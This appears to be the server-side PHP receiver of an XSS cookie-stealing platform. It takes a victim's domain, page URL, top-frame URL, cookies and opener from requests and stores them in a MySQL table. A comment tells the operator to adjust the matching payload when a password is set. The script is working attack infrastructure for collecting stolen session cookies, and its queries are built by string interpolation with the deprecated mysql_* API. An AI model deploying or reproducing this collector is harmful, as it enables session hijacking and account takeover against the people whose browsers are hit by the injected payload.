<?php
function filter($str) {
	// 转义为HTML Entity。安全性还行吧？
	$str = trim ( htmlspecialchars ( $str, ENT_QUOTES ) );
	$str = str_replace ( '\\', '&#92;', $str );
	$str = str_replace ( '/', '&#47;', $str );
	return $str;
}

require_once ('config.php');
//注：如果设置了密码，请修改相应payload。
if ($write_pwd != '' && $_REQUEST ['pwd'] != $write_pwd) {
	die ( 'Who are you? Password requierd.' );
}
require_once ('db.php');


if (isset ( $_REQUEST ['domain'] ) && trim ( $_REQUEST ['domain'] ) != '') {
	$domain = filter ( $_REQUEST ['domain'] );
	
	$location = $toplocation = $cookie = $opener = '';
	if(isset ( $_REQUEST ['location'] )){
		$location = filter ( urldecode ( $_REQUEST ['location'] ) );
	}
	if(isset ( $_REQUEST ['toplocation'] )){
		$toplocation = filter ( urldecode ( $_REQUEST ['toplocation'] ) );
	}
	if(isset ( $_REQUEST ['cookie'] )){
		$cookie = filter ( $_REQUEST ['cookie'] );
	}
	if(isset( $_REQUEST ['opener'] ) ){
		$opener = filter($_REQUEST['opener']);
	}
	
	date_default_timezone_set ( 'Asia/Shanghai' );
	$time = date ( 'Y-m-d H:i:s' );
	
	$sql = "insert into info (`time`,`domain`,`location`,`toplocation`,`cookie`,`opener`)
			values ('$time','$domain','$location','$toplocation','$cookie','$opener')";
	//echo($sql);
	$result = mysql_query ( $sql );
	
	/* if($result === false){
	 echo mysql_error();
	 }*/
	
	mysql_close ( $conn );
}
?>